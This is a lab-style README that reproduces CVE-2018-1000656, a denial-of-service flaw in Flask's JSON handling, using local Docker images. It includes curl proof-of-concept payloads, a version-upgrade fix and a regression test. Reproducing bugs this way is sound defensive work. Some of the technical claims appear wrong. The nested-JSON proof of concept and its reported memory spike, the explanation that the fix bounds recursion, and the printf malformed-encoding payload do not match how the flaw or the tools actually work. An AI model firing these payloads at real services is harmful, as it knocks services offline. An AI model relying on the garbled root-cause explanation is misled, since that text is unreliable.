# CVE-2018-1000656 — Flask JSON Decoder DoS (Vulhub-style reproduction)

## 1. Vulnerability summary

| Field | Value |
|---|---|
| CVE | CVE-2018-1000656 |
| Affected product | Pallets Project Flask |
| Affected versions | **< 0.12.3** |
| Fixed version | 0.12.3 |
| CWE | CWE-20 Improper Input Validation |
| Impact | Denial of Service (large memory consumption) |
| Source | NVD / SUSE / Rapid7 advisory |

**Root cause (one paragraph):**
Flask versions before 0.12.3 use an internal JSON request parser that does not
bound the cost / complexity of malformed JSON input. When an attacker POSTs a
crafted body with `Content-Type: application/json` that uses an abnormal
encoding or deeply recursive structure, the parser allocates large amounts of
memory before it can return an error, eventually exhausting the process and
killing the web worker. No authentication is required — the endpoint just has
to call `request.get_json()`.

## 2. Files in this folder

| File | Purpose |
|---|---|
| `app.py` | Minimal Flask target (same code runs in both images) |
| `Dockerfile.vuln` / `docker-compose.vuln.yml` | Vulnerable build: pins `flask==0.12.2` |
| `Dockerfile.fixed` / `docker-compose.fixed.yml` | Fixed build: upgrades to `flask==0.12.3` |

## 3. Reproduction (vulnerable environment)

Prerequisite: Docker + Docker Compose installed.

```bash
cd vulhub-cve

# 1. Start the vulnerable target
docker compose -f docker-compose.vuln.yml up --build -d

# 2. Confirm it is up
curl -i http://127.0.0.1:8000/
# Expected: HTTP 200, body "POST JSON to /json ..."
```

### PoC — malformed / pathological JSON

The vulnerability is triggered by sending a JSON body whose structure forces
the pre-0.12.3 parser to allocate excessive memory. Two equivalent PoCs:

**PoC A — deep recursive JSON:**

```bash
# Generate a JSON payload with ~5000 levels of nesting
python -c "print('[' * 5000 + '1' + ']' * 5000)" > payload.json

# Watch container memory BEFORE
docker stats --no-stream

# Fire the request (keep it short; the worker will balloon)
curl -s -o /dev/null -w "HTTP %{http_code}  time %{time_total}s\n" \
     -H "Content-Type: application/json" \
     --data-binary @payload.json \
     http://127.0.0.1:8000/json

# Watch container memory AFTER
docker stats --no-stream
```

On Flask 0.12.2 you will see the `web` container's memory spike dramatically
(> 500 MB) and the request either hang or return 500 after the OOM killer
steps in. That is the DoS.

**PoC B — malformed encoding JSON (per the NVD description):**

```bash
printf '{"a":"\\xe2\\x80"}' | \
  curl -s -o /dev/null -w "HTTP %{http_code}\n" \
       -H "Content-Type: application/json" \
       --data-binary @- \
       http://127.0.0.1:8000/json
```

> Screenshots to capture for the report: (1) `docker stats` before / after,
> (2) the curl output showing the hang / 500, (3) the app log showing the
> traceback or OOM message.

## 4. Root-cause analysis

1. The target exposes `POST /json` and calls `request.get_json()`.
2. Before 0.12.3, Flask's JSON wrapper used the stdlib `json` module without
   a recursion / size guard, and its error handling on malformed byte
   sequences caused repeated re-parsing attempts.
3. An unauthenticated remote attacker can therefore exhaust memory by sending
   a small (on the wire) but expensive-to-parse payload.
4. Business impact: availability of the API; if the container has no memory
   limit, it can also starve other processes on the host.

## 5. Fix

Stop the vulnerable stack and start the patched one:

```bash
docker compose -f docker-compose.vuln.yml down

# Build & run the patched image (Flask 0.12.3)
docker compose -f docker-compose.fixed.yml up --build -d
```

The single meaningful change is in `Dockerfile.fixed`:

```diff
- RUN pip install --no-cache-dir flask==0.12.2
+ RUN pip install --no-cache-dir flask==0.12.3
```

Why this works: 0.12.3 bounds the JSON decoder's input handling so a malformed
or pathologically nested payload is rejected quickly with a 400, without
allocating unbounded memory.

> Hardening note for production: also (a) set a memory limit on the container
> (`mem_limit:` in compose), (b) put a reverse proxy with a request-body size
> limit in front, (c) prefer a current Flask release (`>= 2.3`) rather than
> 0.12.3.

## 6. Verify the fix + regression test

### 6.1 Re-run the PoC — must now fail (i.e. be rejected quickly)

```bash
# Same payload as PoC A
python -c "print('[' * 5000 + '1' + ']' * 5000)" > payload.json

curl -s -o /dev/null -w "HTTP %{http_code}  time %{time_total}s\n" \
     -H "Content-Type: application/json" \
     --data-binary @payload.json \
     http://127.0.0.1:8000/json

docker stats --no-stream
```

Expected on the fixed build: HTTP 400 returned in milliseconds, container
memory flat (tens of MB, no spike). That is the proof the DoS is gone.

> Screenshot for the report: the 400 / fast response + flat `docker stats`.

### 6.2 Regression test — legitimate business must still work

```bash
curl -s -H "Content-Type: application/json" \
     -d '{"hello":"world"}' \
     http://127.0.0.1:8000/json
# Expected: {"echo":{"hello":"world"}}
```

The normal JSON echo endpoint still responds correctly.

## 7. Clean up

```bash
docker compose -f docker-compose.fixed.yml down
```
